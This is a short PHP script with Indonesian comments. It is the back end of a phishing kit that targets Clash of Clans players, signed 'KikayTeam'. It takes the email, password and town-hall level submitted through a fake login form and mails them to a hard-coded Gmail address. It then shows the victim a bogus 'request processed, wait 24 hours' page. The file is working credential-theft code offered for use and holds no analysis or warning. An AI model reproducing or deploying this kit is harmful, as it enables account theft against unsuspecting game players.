<?php
############################################
##        Author: Kikay                   ##
##       Mailer: Lomen                    ##
##       Modifer: carakikay.blogspot.com  ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'Phising COC by KikayTeam';
$mailto = 'dika12jak@gmail.com'; // masukin email di sini 

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['email'];
$dom = $_POST['domain'];
$paswot = $_POST['pass'];
$teha = $_POST ['th'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Email : <font color="green">$imel</font> <br>
Password : <font color="purple">$paswot</font> <br>
TH : <font color="blue">$teha</font> <br>
EOD;


$headers = "From: info@KikayTEAM.ga\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<title> Thank You ! </title>
<center> <h2> Your Request Hasbeen Proccessed,Wait 24 Hours </h2><br>		